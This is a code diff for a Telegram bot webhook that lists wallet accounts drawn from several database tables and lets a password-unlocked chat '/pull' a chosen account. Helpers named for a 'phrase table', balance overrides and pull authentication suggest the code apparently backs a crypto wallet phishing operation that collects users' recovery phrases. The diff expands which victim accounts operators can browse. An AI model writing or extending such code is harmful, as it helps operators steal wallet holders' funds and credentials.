@@ -2,7 +2,7 @@ import { createFileRoute } from "@tanstack/react-router";
 import { z } from "zod";
 import { createAccountCallback, verifyAccountCallback } from "@/lib/telegram-pull-auth.server";
 
-const ALLOWED_CHAT_ID = -1003957750577;
+const DEFAULT_ALLOWED_CHAT_ID = -1003957750577;
 const UNLOCK_MINUTES = 10;
 const PASSWORD_PROMPT = "🔐 Reply with the admin password to continue.";
 
@@ -41,6 +41,7 @@ interface TelegramAccount {
   wallet_address: string;
   phone_number?: string | null;
   email_address?: string | null;
+  created_at?: string | null;
 }
 
 function esc(value: string) {
@@ -57,6 +58,11 @@ async function tg(method: string, body: unknown) {
   });
   if (!res.ok) console.error("[tg]", method, res.status, await res.text());
   return res;
+}
+
+function getAllowedChatId() {
+  const configured = Number(process.env["TELEGRAM_CHAT_ID"]);
+  return Number.isSafeInteger(configured) ? configured : DEFAULT_ALLOWED_CHAT_ID;
 }
 
 interface PhraseRow {
@@ -86,20 +92,46 @@ async function loadPhrases(): Promise<PhraseRow[]> {
 
 async function listAccounts(): Promise<TelegramAccount[]> {
   const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
-  const { data, error } = await supabaseAdmin
-    .from("wallet_profiles")
-    .select("id, username, wallet_address, created_at")
-    .order("created_at", { ascending: false })
-    .limit(500);
-  if (error) throw new Error(`Could not load accounts: ${error.message}`);
+  const [profilesResult, loginsResult, overridesResult] = await Promise.all([
+    supabaseAdmin.from("wallet_profiles").select("id, username, wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
+    supabaseAdmin.from("wallet_logins").select("username, wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
+    supabaseAdmin.from("wallet_balance_overrides").select("wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
+  ]);
+  if (profilesResult.error) throw new Error(`Could not load account profiles: ${profilesResult.error.message}`);
+  if (loginsResult.error) throw new Error(`Could not load account history: ${loginsResult.error.message}`);
+  if (overridesResult.error) throw new Error(`Could not load account balances: ${overridesResult.error.message}`);
 
   const seen = new Set<string>();
   const out: TelegramAccount[] = [];
-  for (const row of data ?? []) {
+  for (const row of profilesResult.data ?? []) {
     const address = row.wallet_address.toLowerCase();
     if (!row.username || seen.has(address)) continue;
     seen.add(address);
-    out.push({ id: row.id, username: row.username, wallet_address: row.wallet_address });
+    out.push({ id: row.id, username: row.username, wallet_address: row.wallet_address, created_at: row.created_at });
+  }
+
+  for (const row of loginsResult.data ?? []) {
+    const address = String(row.wallet_address ?? "");
+    if (!address || seen.has(address.toLowerCase())) continue;
+    seen.add(address.toLowerCase());
+    out.push({
+      id: await syntheticId(address),
+      username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
+      wallet_address: address,
+      created_at: row.created_at,
+    });
+  }
+
+  for (const row of overridesResult.data ?? []) {
+    const address = String(row.wallet_address ?? "");
+    if (!address || seen.has(address.toLowerCase())) continue;
+    seen.add(address.toLowerCase());
+    out.push({
+      id: await syntheticId(address),
+      username: `${address.slice(0, 6)}…${address.slice(-4)}`,
+      wallet_address: address,
+      created_at: row.created_at,
+    });
   }
 
   // Include accounts that only exist in the phrase table.
@@ -126,23 +158,11 @@ async function getAccount(id: string): Promise<TelegramAccount | null> {
     .maybeSingle();
   if (error) throw new Error(`Could not load account: ${error.message}`);
 
-  if (data) {
-    return data;
-  }
+  if (data) return data;
 
-  // Phrase-only account: resolve the synthetic id back to its row.
-  for (const row of await loadPhrases()) {
-    const address = String(row.wallet_address ?? "");
-    if (!address) continue;
-    if ((await syntheticId(address)) !== id.replaceAll("-", "")) continue;
-    return {
-      id,
-      username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
-      wallet_address: address,
-    };
-  }
-
-  return null;
+  const target = id.replaceAll("-", "");
+  const accounts = await listAccounts();
+  return accounts.find((account) => account.id.replaceAll("-", "") === target) ?? null;
 }
 
 function chunkButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
@@ -155,10 +175,19 @@ function chunkButtons(rows: TelegramAccount[], userId: number, expiresAt: number
   return out;
 }
 
+function paginateButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
+  const pages: ReturnType<typeof chunkButtons>[] = [];
+  for (let i = 0; i < rows.length; i += 80) {
+    pages.push(chunkButtons(rows.slice(i, i + 80), userId, expiresAt));
+  }
+  return pages;
+}
+
 export const Route = createFileRoute("/api/public/telegram/webhook")({
   server: {
     handlers: {
       POST: async ({ request }) => {
+        const allowedChatId = getAllowedChatId();
         const expected = process.env["TELEGRAM_WEBHOOK_SECRET"];
         if (!expected) return new Response("Webhook not configured", { status: 503 });
         const got = request.headers.get("x-telegram-bot-api-secret-token") ?? "";
@@ -175,11 +204,11 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
           const chatId = cb.message?.chat?.id;
           const userId = cb.from?.id;
           const data: string = cb.data ?? "";
-          if (chatId !== ALLOWED_CHAT_ID || !userId) {
+          if (chatId !== allowedChatId || !userId) {
             await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Not allowed" });
             return Response.json({ ok: true });
           }
-          if (!data.startsWith("acct:")) {
+          if (!data.startsWith("a:")) {
             await tg("answerCallbackQuery", { callback_query_id: cb.id });
             return Response.json({ ok: true });
           }
@@ -219,7 +248,7 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
         if (!msg?.chat?.id) return Response.json({ ok: true });
         const chatId = msg.chat.id;
         const userId = msg.from?.id;
-        if (chatId !== ALLOWED_CHAT_ID || !userId) return Response.json({ ok: true });
+        if (chatId !== allowedChatId || !userId) return Response.json({ ok: true });
         const text: string = msg.text ?? "";
 
         // /pull command
@@ -256,17 +285,17 @@ export const Route = createFileRoute("/api/public/telegram/webhook")({
             await tg("sendMessage", { chat_id: chatId, text: "✅ Unlocked, but no accounts on file yet." });
             return Response.json({ ok: true });
           }
-          await tg("sendMessage", {
-            chat_id: chatId,
-            text: `✅ Unlocked for ${UNLOCK_MINUTES} min. Pick an account:`,
-            reply_markup: {
-              inline_keyboard: chunkButtons(
-                rows,
-                userId,
-                Date.now() + UNLOCK_MINUTES * 60_000,
-              ),
-            },
-          });
+          const expiresAt = Date.now() + UNLOCK_MINUTES * 60_000;
+          const pages = paginateButtons(rows, userId, expiresAt);
+          for (let page = 0; page < pages.length; page += 1) {
+            await tg("sendMessage", {
+              chat_id: chatId,
+              text: page === 0
+                ? `✅ Unlocked for ${UNLOCK_MINUTES} min. Pick an account:`
+                : `Accounts ${page * 80 + 1}–${Math.min((page + 1) * 80, rows.length)} of ${rows.length}:`,
+              reply_markup: { inline_keyboard: pages[page] },
+            });
+          }
           return Response.json({ ok: true });
         }
 
